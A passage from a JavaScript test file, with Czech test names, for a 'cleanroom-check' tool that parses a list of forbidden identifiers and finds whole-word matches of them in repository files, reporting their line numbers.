    const { code } = run(CLEANROOM, repoWith('ProprietaryActionRunner\n', 'export const x = 1;\n'));
    expect(code).toBe(0);
  });

});

describe('cleanroom-check: čisté funkce', () => {
  it('parseList zahodí komentáře a prázdné řádky', () => {
    expect(parseList('# hlavička\n\nAlfa\n  Beta  \n# konec\n')).toEqual(['Alfa', 'Beta']);
  });

  it('findHits vrací číslo řádku od jedničky', () => {
    expect(findHits('nic\nAlfa tady\n', ['Alfa'])).toEqual([{ identifier: 'Alfa', index: 0, line: 2 }]);
  });

  it('findHits nebere podřetězec uvnitř delšího identifikátoru', () => {
    expect(findHits('const AlfaBeta = 1;\nconst x_Alfa_y = 2;\n', ['Alfa'])).toEqual([]);
  });

  it('findHits bere identifikátor oddělený tečkou nebo závorkou', () => {
    expect(findHits('eca.Alfa(1);\n', ['Alfa'])).toEqual([{ identifier: 'Alfa', index: 0, line: 1 }]);
  });
});
